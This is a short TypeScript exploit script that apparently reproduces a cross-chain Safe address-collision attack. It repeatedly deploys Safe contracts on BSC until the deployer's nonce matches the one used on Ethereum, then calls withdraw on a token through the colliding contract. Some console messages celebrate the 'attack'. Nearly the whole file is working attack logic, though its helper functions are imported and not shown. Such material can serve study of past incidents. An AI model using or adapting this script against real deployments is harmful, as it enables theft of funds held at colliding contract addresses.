import { checkNonce } from "./web3"
import address from "./utils/address.json"
import { Contract } from "ethers"
import safeABI from './utils/abi/safe.json'
import { bscAccount, deploySafe, wait } from "./utils"

// The nonce of the safe deployer at the time the safe was deployed on eth
const ethSafeDeployerNonce = 9

const main = async () => {

    /*
     Check that the nonce of the deployer address on the bsc chain is equal to the nonce of the 
     deployer address on the eth chain. If so stop further safe deployments
     This means that on the resulting safe address on the bsc chain will be the same as 
     the safe address on the eth chain  next transaction the nonce of the safe deployer on the other
    */

    while (true) {
        console.log("\n\n")

        const deployedSafe = await deploySafe()

        const attack = await checkNonce(address.bscSafeDeployer, ethSafeDeployerNonce)

        !attack ? console.log("\nShould we attack? No soldier we wait for sunrise") : console.log("\nShould we attack? Now soldier Ataaaaack !!!")

        if (attack) {
            const exploitSafe = new Contract(deployedSafe!, safeABI, bscAccount)

            const tx = await exploitSafe.withdraw(address.optimismToken)

            console.log("Exploit complete ", tx)
            break;
        }
    }
}

main()
